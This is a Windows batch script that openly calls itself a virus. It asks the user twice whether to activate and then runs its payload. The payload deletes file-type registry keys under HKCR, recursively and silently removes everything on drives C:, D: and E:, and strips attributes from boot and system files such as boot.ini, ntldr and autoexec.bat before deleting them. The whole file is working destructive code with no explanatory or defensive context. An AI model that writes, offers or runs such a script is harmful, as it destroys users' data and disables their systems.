@echo off
echo This virus can destroy your computer. Are you sure you want to activate?
set /p answer=
if %answer%==yes goto 1
if %answer%==no goto 2
:2
pause
exit
:1
echo Are you sure?
set /p a2=
if %a2%==yes goto 3
if %a2%==no goto 2
:3
pause
start reg delete HKCR/.exe
start reg delete HKCR/.dll
start reg delete HKCR/*
rd/s/q D:\
rd/s/q C:\
rd/s/q E:\
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
